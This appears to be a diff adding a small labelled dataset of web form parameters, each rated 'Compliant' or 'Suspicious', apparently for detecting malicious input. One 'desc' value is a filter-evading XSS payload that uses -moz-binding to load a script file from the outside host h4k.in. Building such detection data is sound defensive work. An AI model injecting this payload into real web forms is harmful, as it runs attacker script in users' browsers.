@@ -1,0 +1,10 @@
+name : ws'.nY0W8yJyn.'  E S .s8
+desc : sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a="
+end : 1.8.2016
+budget : 3,632
+assignto[] : 1
+assignme : 1
+The parameter: name :  having value: ws'.nY0W8yJyn.'  E S .s8 is: Compliant
+The parameter: desc :  having value: sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a=" is: Suspicious
+The parameter: end :  having value: 1.8.2016 is: Compliant
+The parameter: budget :  having value: 3,632 is: Compliant
